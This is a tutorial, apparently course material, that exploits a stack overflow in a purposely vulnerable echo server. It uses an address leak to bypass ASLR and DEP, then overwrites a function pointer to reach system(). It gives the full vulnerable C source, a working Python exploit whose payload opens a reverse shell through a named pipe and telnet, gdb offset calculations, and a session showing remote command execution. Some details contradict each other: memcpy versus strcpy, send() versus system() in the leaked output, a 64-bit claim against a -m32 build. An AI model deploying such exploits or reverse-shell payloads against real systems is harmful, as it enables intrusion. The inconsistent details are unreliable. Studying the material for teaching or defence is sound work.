# Example 2 - Echo server with info leak #

Here we present an example of stack overflow exploitation using an information leak to bypass ASLR (and DEP) on Ubuntu 12.04 64 bits. The vulnerable program is an echo server that keeps listening to client connections on port 4000 and when a client connects, receives some data and sends the same data back. In this example we will exploit a program that uses [canaries](http://en.wikipedia.org/wiki/Canary_value) to secure functions against attacks that change the return address of functions. The key idea is to overwrite a function pointer p inside the vulnerable code. In this way, when p is used to call a function, we will point it to another target, effectively gaining control of the program.

## Echo server ##

The echo server code is shown below:

```
/* Echo server with info leak
 * Compile with:
 *     clang -m32 -fstack-protector -g server.c -o server -pie -f PIE
 * the -fstack-protector directive instructs clang to add canaries to the
 * function code, so that attacks that try to change the return address of the
 * function will not succeed.
 */

#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define MAXRECVLEN 500
#define PORT 4000

void log(char *inbuf) {
    printf("Received %d bytes\n", strlen(inbuf));
}

void process_input(char *inbuf, int len, int clientfd) {
    void (*foo)(char *);
    char localbuf[120];

    if (!strcmp(inbuf, "debug\n")) {
          sprintf(localbuf, "localbuf %p\nsend() %p\n", localbuf,
                  send);
    } else {
        foo = &log;
        strcpy(localbuf, inbuf);
        foo(inbuf);
    }

    send(clientfd, localbuf, strlen(localbuf), 0);
}

int main() {
    int sockfd, clientfd, clientlen, len;
    char inbuf[MAXRECVLEN + 1];
    struct sockaddr_in myaddr, clientaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    myaddr.sin_family = AF_INET;
    myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    myaddr.sin_port = htons(PORT);

    bind(sockfd, (struct sockaddr *)&myaddr, sizeof(myaddr));
    listen(sockfd, 5);

    clientlen = sizeof(clientaddr);

    while (1) {
        clientfd = accept(sockfd, (struct sockaddr *)&clientaddr, &clientlen);
        
        len = recv(clientfd, inbuf, MAXRECVLEN, 0);
        inbuf[len] = '\0';
        
        process_input(inbuf, len + 1, clientfd);
        
        close(clientfd);
    }
    
    close(sockfd);

    return 0;
}
```

The stack overflow occurs at the _process\_input()_ function, when the data received from the client is copied into _localbuf_ via _memcpy()_. We will try to overwrite the value of _foo_, which is a pointer to a function. The information leak also occurs at the same function, when the server recognizes the special string "debug" and returns two internal addresses: the address of _localbuf_, which is a stack address, and the address of send(), which is an address of a function from the dynamic loaded library libc.

## Information leak to defeat ASLR ##

Ubuntu 12.04 comes with ASLR and DEP mitigations enabled by default. There are some known bypass techniques that can be used to overcome these mitigations, such as brute-force and information leaks for ASLR and _return-into-libc_ and _return-oriented programming_ for DEP. In this example, we use the information leak caused by the "debug" input to obtain addresses to be used in a _return-into-libc_ attack.

We can see the randomized addresses by running the server twice and issuing the "debug" command on a client. To do it, run the following commands in a terminal to start the server:

```
$ clang -m32 -fstack-protector -g server.c -o server -pie -fPIE
$ ./server
```

In a second terminal, run _netcat_ and send "debug":

```
$ nc localhost 4000
debug
localbuf 0xffed9970
system() 0xf763e430
```

Now finish the server and restart it:

```
$ ./server
```

And send the "debug" string again:

```
$ nc localhost 4000
debug
localbuf 0xffb05100
system() 0xf75ac430
```

So, we can see that in each run both addresses are different. To build the exploit, we take advantage of this information leak to execute a _return-into-libc_ attack.
We bypass the clang's stack canary by overwriting the function pointer _foo_ located right after the overflowed buffer.

## The exploit ##

A Python script that takes this approach to exploit the server is shown below:

```
# Exploit for buggy echo server running on Ubuntu 12.04 64 bits
# with DEP and ASLR enabled
#
# Run "nc -vv -l -p 8080" in a second terminal before running this script
# to receive the connect-back shell

import socket
import struct

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('localhost', 4000))

buf = "debug\n"
c.send(buf)
buf = c.recv(512)
leaked_stack_addr = int(buf[9:buf.find('\n')], 16)
leaked_send_addr = int(buf[27:buf.rfind('\n')], 16)
c.close()

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('localhost', 4000))

command = ('rm -f backpipe && mknod backpipe p &&'
           'telnet localhost 8080 0<backpipe | /bin/bash 1>backpipe;')

system_addr = leaked_send_addr - 0xb1390
pad = 120 - len(command)
buf = (command + 'A' * pad +
       struct.pack('I', system_addr)
       )
c.send(buf)

c.close()
```

The exploit makes two connections to the echo server. In the first one, it sends the "debug" string to receive the two leaked addresses. Then, it makes the second connection to send the malicious data to create a connect-back shell.

The malicious data is composed of:

  * the string containing the command to create the connect-back shell
  * pad bytes to fill the buffer until we reach the function pointer
  * the address of _system()_ calculated from the leaked _send()_ address

To calculate the addresses of _system()_ from the leaked _send()_ address, we need to calculate the offset first. So, we load _gdb_, set a breakpoint on _main()_, run the server and issue some commands to get the addresses of _send()_ and _system()_, as follows:

```
$ gdb --quiet ./server 
Reading symbols from /home/xxx/xpl/server...done.
(gdb) b main
Breakpoint 1 at 0xa0d: main. (2 locations)
(gdb) run
Starting program: /home/xxx/xpl/server 

Breakpoint 1, main () at server.c:39
39	    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
(gdb) p send
$1 = {<text variable, no debug info>} 0xf7efa7c0 <send>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e49430 <system>
(gdb) 
```

After obtaining these addresses, we calculate the offsets as follows:

```
system_send_offset = system_addr - send_addr = 0xf7e49430 - 0xf7efa7c0 = - 0xb1390
```

With this offset we can calculate the _system()_ address right from the the leaked _send()_ address.

When the function pointed by _foo_ is called, it will jump to the _system()_ function and execute the malicious command.

## Running the exploit ##

We can run the exploit and execute commands on the server with the following steps.

First, run the server in a terminal:

```
$ ./server
```

Second, start _netcat_ in listening mode on port 8080 to receive the connect-back shell:

```
$ nc -vv -l -p 8080
```

Third, run the exploit in a third terminal:

```
$ python exploit.py
```

Finally, return to the _netcat_ terminal and send some commands:

```
$ nc -vv -l -p 8080
listening on [any] 8080 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 36597
date
Thu Feb 25 14:45:04 BRT 2013
uname -a
Linux xxx 3.2.0-38-generic #61-Ubuntu SMP Tue Feb 19 12:18:21 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
```

The files used here are available at Downloads page.